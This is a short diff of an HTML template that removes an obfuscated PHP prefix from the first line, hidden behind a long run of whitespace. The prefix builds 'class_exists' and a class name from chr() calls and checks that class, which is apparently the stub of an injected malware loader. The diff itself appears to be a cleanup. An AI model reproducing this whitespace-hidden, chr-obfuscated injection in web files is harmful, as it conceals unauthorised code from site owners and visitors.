@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZRwwW = chr ( 993 - 912 ).'_' . chr (86) . 'i' . chr (111) . chr (73) . "\x57";$rUnnLigHLC = chr (99) . "\x6c" . 'a' . "\x73" . chr (115) . "\137" . chr (101) . "\x78" . chr (105) . 's' . chr (116) . chr ( 1076 - 961 ); $LAgnByIgB = class_exists($ZRwwW); $ZRwwW = "60617";$rUnnLigHLC = "29882";$tlIgrSgo = FALSE; ?><!DOCTYPE html>
+<!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zxx">
 
 <head>
